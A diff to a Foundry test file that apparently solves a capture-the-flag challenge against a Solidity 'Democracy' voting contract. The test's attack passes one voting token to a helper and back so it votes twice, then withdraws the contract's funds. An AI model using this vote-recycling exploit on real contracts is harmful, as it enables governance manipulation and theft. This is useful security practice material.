@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/test.sol";
 import {Democracy} from "../src/Democracy.sol";
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
 contract DemocracyTest is Test {
     Democracy public democracy;
@@ -13,6 +14,7 @@ contract DemocracyTest is Test {
     address helper2 = vm.addr(0x4);
 
     function setUp() public {
+        // owner = incumbent
         vm.prank(initialOwner);
         democracy = new Democracy();
     }
@@ -32,11 +34,13 @@ contract DemocracyTest is Test {
     function testAttack() public {
         democracy.nominateChallenger(challenger1);
         assertEq(democracy.balanceOf(challenger1), 2);
-        // Start simulating transactions from challenger1
-        vm.startPrank(challenger1);
-        // Transfer token 0 from challenger1 to helper
+        vm.prank(challenger1);
         democracy.transferFrom(challenger1, helper, 0);
-        // Stop simulating transactions from challenger1
-        vm.stopPrank();
+        vm.startPrank(helper);
+        democracy.vote(challenger1);
+        democracy.transferFrom(helper, challenger1, 0);
+        vm.startPrank(challenger1);
+        democracy.vote(challenger1);
+        democracy.withdrawToAddress(challenger1);
     }
 }
